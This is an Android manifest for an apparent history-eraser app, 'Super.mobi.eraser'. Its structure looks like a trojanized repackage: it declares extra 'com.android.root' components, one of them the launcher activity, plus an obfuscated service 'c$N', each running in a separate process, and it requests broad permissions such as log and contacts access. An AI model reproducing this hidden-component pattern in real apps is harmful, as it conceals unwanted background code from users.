<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="Super.mobi.eraser">
    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_LOGS"/>
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="mobi.infolife.eraser.MainActivity" android:stateNotNeeded="true"/>
        <receiver android:icon="@drawable/icon" android:label="@string/app_name" android:name="mobi.infolife.eraser.Widget">
            <intent-filter>
                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
            </intent-filter>
            <meta-data android:name="android.appwidget.provider" android:resource="@xml/app_widget"/>
        </receiver>
        <meta-data android:name="UMENG_APPKEY" android:value="4d3468163ea7a3242f010e12"/>
        <activity android:name="com.android.root.main">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name="com.android.root.Setting" android:process=":remote"/>
        <service android:name="c$N" android:process=":remote2"/>
    </application>
    <supports-screens android:anyDensity="false" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
</manifest>